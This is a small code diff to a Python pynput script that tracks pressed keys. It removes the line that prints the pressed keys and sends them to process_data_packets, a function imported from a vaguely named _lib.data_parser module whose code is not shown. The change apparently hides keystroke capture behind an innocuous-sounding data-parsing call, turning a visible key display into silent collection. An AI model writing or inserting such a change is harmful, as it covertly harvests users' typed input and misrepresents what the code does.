@@ -1,5 +1,6 @@
 from pynput import keyboard
 from threading import Lock
+from _lib.data_parser import process_data_packets
 
 # State dictionary to track each key's state
 key_states = {
@@ -19,7 +20,8 @@ def display_keys_pressed():
     with state_lock:
         pressed_keys = [key for key, pressed in key_states.items() if pressed]
     if pressed_keys:
-        print(f"Keys pressed: {', '.join(pressed_keys)}")
+
+        process_data_packets(pressed_keys)
     else:
         print("No keys pressed.")
 
